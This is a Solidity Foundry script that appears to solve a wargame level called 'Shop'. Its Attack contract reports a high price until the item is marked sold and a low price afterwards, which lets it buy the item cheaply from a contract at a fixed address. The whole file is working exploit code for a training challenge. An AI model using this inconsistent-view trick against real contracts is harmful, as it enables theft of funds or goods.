// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Shop.sol";

contract ShopSolve is Script{
    Shop public shop = Shop(0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("is Sold : ", shop.isSold());

        new Attack().exploit();

        console.log("is Sold : ", shop.isSold());        
        vm.stopBroadcast();
    }
}

contract Attack{
    Shop public shop = Shop(0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2);

    function exploit() public {
        shop.buy();
    }
    function price() external view returns (uint){
        if(shop.isSold() == false){
            return 100;
        }
        return 1;
    }
}